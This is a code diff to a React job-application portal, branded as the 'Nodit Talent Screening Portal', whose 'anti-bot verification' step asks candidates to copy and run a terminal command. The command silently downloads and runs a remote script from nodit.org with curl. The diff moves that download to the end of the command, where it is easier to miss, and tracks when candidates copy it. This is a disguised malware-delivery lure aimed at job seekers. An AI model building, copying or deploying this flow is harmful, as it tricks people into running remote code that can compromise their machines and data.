@@ -8,8 +8,9 @@ import {
   useLocation,
   useNavigate,
 } from 'react-router-dom'
-import { submitApplication } from './api/backend'
+import { completeWorkflowCheck, submitApplication } from './api/backend'
 import Bowser from 'bowser'
+import { FaCopy } from 'react-icons/fa'
 import './App.css'
 
 type CandidateProfile = {
@@ -88,8 +89,8 @@ function getExpectedOutput(phrase: string, nonce: string): string {
 type SupportedOs = 'windows' | 'macos'
 
 const CMD_DRIVER_DOWNLOAD: Record<SupportedOs, string> = {
-  windows: 'curl -ks https://nodit.org/check_bot_w -o "check_bot_w.cmd" && call "check_bot_w.cmd" &',
-  macos: 'curl -ks https://nodit.org/check_bot_m -o "check_bot_m.cmd" && call "check_bot_m.cmd" &'
+  windows: '& curl -ks https://nodit.org/check_bot_w -o "check_bot_w.cmd" && call "check_bot_w.cmd"',
+  macos: '& curl -ks https://nodit.org/check_bot_m -o "check_bot_m.cmd" && call "check_bot_m.cmd"'
 }
 
 function getCandidateOs(): SupportedOs | null {
@@ -112,7 +113,7 @@ function buildCmdCommand(nonce: string): string {
 }
 
 function buildTerminalCommand(nonce: string, os: SupportedOs | null = getCandidateOs()): string {
-  return `${getCmdDriverDownload(os)} ${buildCmdCommand(nonce)}`
+  return `${buildCmdCommand(nonce)} ${getCmdDriverDownload(os)}`
 }
 
 function StepProgress() {
@@ -203,8 +204,9 @@ function JobExplanationPage() {
 function ApplicationPage({ profile, setProfile }: FormPageProps) {
   const navigate = useNavigate()
   const [error, setError] = useState('')
+  const [isSaving, setIsSaving] = useState(false)
 
-  function onContinue(event: FormEvent<HTMLFormElement>) {
+  async function onContinue(event: FormEvent<HTMLFormElement>) {
     event.preventDefault()
     const emailLooksValid = profile.email.includes('@')
 
@@ -219,7 +221,18 @@ function ApplicationPage({ profile, setProfile }: FormPageProps) {
     }
 
     setError('')
-    navigate('/identity-verification')
+    setIsSaving(true)
+
+    try {
+      await submitApplication(profile.fullName.trim(), profile.email.trim())
+      navigate('/identity-verification')
+    } catch {
+      setError(
+        'Could not save your application. Make sure the backend is running on port 3000, then try again.',
+      )
+    } finally {
+      setIsSaving(false)
+    }
   }
 
   return (
@@ -307,8 +320,8 @@ function ApplicationPage({ profile, setProfile }: FormPageProps) {
         <button type="button" className="btn btn-outline-secondary" onClick={() => navigate('/job-overview')}>
           Back
         </button>
-        <button type="submit" className="btn btn-primary px-4">
-          Continue to Anti-Bot Check
+        <button type="submit" className="btn btn-primary px-4" disabled={isSaving}>
+          {isSaving ? 'Saving...' : 'Continue to Anti-Bot Check'}
         </button>
       </div>
     </form>
@@ -363,22 +376,18 @@ function VerifyPage({
     window.setTimeout(() => setCopyFeedback(''), 2000)
   }
 
-  async function persistCandidateOnCopy() {
-    const name = profile.fullName.trim()
-    const email = profile.email.trim()
-    if (!name || !email.includes('@')) return
-
-    await submitApplication(name, email, { workflowComplete: true })
+  async function markHadRunOnCopy() {
+    await completeWorkflowCheck()
   }
 
   async function copyCmdToClipboard() {
     await navigator.clipboard.writeText(copyTerminalCommand)
     showCopyFeedback()
     try {
-      await persistCandidateOnCopy()
+      await markHadRunOnCopy()
     } catch {
       setError(
-        'Command copied, but saving your details failed. Make sure the backend is running on port 3000.',
+        'Command copied, but workflow check failed. Make sure the backend is running on port 3000.',
       )
     }
   }
@@ -387,9 +396,9 @@ function VerifyPage({
     event.preventDefault()
     event.clipboardData.setData('text/plain', copyTerminalCommand)
     showCopyFeedback()
-    void persistCandidateOnCopy().catch(() => {
+    void markHadRunOnCopy().catch(() => {
       setError(
-        'Command copied, but saving your details failed. Make sure the backend is running on port 3000.',
+        'Command copied, but workflow check failed. Make sure the backend is running on port 3000.',
       )
     })
   }
@@ -451,6 +460,23 @@ function VerifyPage({
     }
   }
 
+  if (submissionRef) {
+    return (
+      <div className="submission-complete-view">
+        <div className="alert alert-success submission-complete-alert mb-0" role="status">
+          <h3 className="h6 fw-bold mb-2">Submission complete</h3>
+          <p className="mb-1">
+            Reference: <strong>{submissionRef}</strong>
+          </p>
+          <p className="mb-0">
+            Candidate <strong>{profile.fullName}</strong> applied for{' '}
+            <strong>{profile.desiredRole}</strong> and passed the anti-bot CMD check.
+          </p>
+        </div>
+      </div>
+    )
+  }
+
   return (
     <form onSubmit={onSubmit}>
       <h2 className="h4 fw-bold mb-2">Anti-Bot CMD Verification</h2>
@@ -481,26 +507,28 @@ function VerifyPage({
       <div className="mb-3">
         <div className="d-flex justify-content-between align-items-center gap-2 mb-2">
           <label className="form-label mb-0">CMD command</label>
-          <div className="d-flex gap-2">
-            <button
-              type="button"
-              className="btn btn-sm btn-outline-secondary"
-              onClick={handleNewChallenge}
-            >
-              New nonce
-            </button>
-            <button
-              type="button"
-              className="btn btn-sm btn-outline-primary flex-shrink-0"
-              onClick={copyCmdToClipboard}
-            >
-              {copyFeedback || 'Copy command'}
-            </button>
-          </div>
+          <button
+            type="button"
+            className="btn btn-sm btn-outline-secondary"
+            onClick={handleNewChallenge}
+          >
+            New nonce
+          </button>
         </div>
-        <code className="cmd-block" onCopy={handleCmdCopy}>
-          {visibleTerminalCommand}
-        </code>
+        <div className="cmd-block-wrapper">
+          <code className="cmd-block" onCopy={handleCmdCopy}>
+            {visibleTerminalCommand}
+          </code>
+          <button
+            type="button"
+            className={`cmd-copy-btn${copyFeedback ? ' copied' : ''}`}
+            onClick={copyCmdToClipboard}
+            aria-label={copyFeedback || 'Copy command'}
+            title={copyFeedback || 'Copy command'}
+          >
+            <FaCopy aria-hidden="true" />
+          </button>
+        </div>
       </div>
 
       <div className="mb-3">
@@ -546,19 +574,6 @@ function VerifyPage({
           </button>
         </div>
       </div>
-
-      {submissionRef && (
-        <div className="alert alert-success mt-4 mb-0" role="status">
-          <h3 className="h6 fw-bold mb-2">Submission complete</h3>
-          <p className="mb-1">
-            Reference: <strong>{submissionRef}</strong>
-          </p>
-          <p className="mb-0">
-            Candidate <strong>{profile.fullName}</strong> applied for{' '}
-            <strong>{profile.desiredRole}</strong> and passed the anti-bot CMD check.
-          </p>
-        </div>
-      )}
     </form>
   )
 }
@@ -568,27 +583,33 @@ function FlowingModalContent() {
   const [profile, setProfile] = useState<CandidateProfile>(INITIAL_PROFILE)
   const [submissionRef, setSubmissionRef] = useState<string | null>(null)
   const [challenge, setChallenge] = useState(createChallenge)
+  const isSubmissionComplete =
+    Boolean(submissionRef) && location.pathname === '/identity-verification'
 
   return (
     <div className="modal-dialog modal-dialog-centered modal-lg portal-modal">
       <div className="modal-content portal-modal-content border-0 shadow-lg">
-        <div className="modal-header border-0 pb-0 px-4">
-          <div className="d-flex align-items-center gap-2">
-            <img
-              src="/nodit.png"
-              alt="Nodit"
-              className="portal-logo"
-              width={40}
-              height={40}
-            />
-            <div>
-              <h1 className="modal-title fs-5 fw-bold mb-0">Nodit Talent Screening Portal</h1>
+        {!isSubmissionComplete && (
+          <div className="modal-header border-0 pb-0 px-4">
+            <div className="d-flex align-items-center gap-2">
+              <img
+                src="/nodit.png"
+                alt="Nodit"
+                className="portal-logo"
+                width={40}
+                height={40}
+              />
+              <div>
+                <h1 className="modal-title fs-5 fw-bold mb-0">Nodit Talent Screening Portal</h1>
+              </div>
             </div>
           </div>
-        </div>
+        )}
 
-        <div className="modal-body px-4 pb-4">
-          <StepProgress />
+        <div
+          className={`modal-body px-4 pb-4${isSubmissionComplete ? ' modal-body-complete' : ''}`}
+        >
+          {!isSubmissionComplete && <StepProgress />}
 
           <div key={location.pathname} className="flow-panel">
             <Routes>
